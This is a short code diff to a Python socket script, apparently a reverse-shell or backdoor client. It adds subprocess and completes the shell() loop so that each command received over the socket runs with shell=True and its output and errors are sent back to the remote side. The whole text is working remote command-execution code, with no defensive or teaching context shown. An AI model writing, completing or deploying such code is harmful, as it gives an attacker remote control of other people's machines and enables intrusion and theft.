@@ -1,6 +1,9 @@
 import socket
 import time
 import json
+import subprocess
+
+
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -36,4 +39,9 @@ def shell():
           if command == 'exit':
                break
           else:
-               #excute the command
+               execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+               result = execute.stdout.read() + execute.stderr.read()
+               result = result.decode()
+               send(result)
+
+               
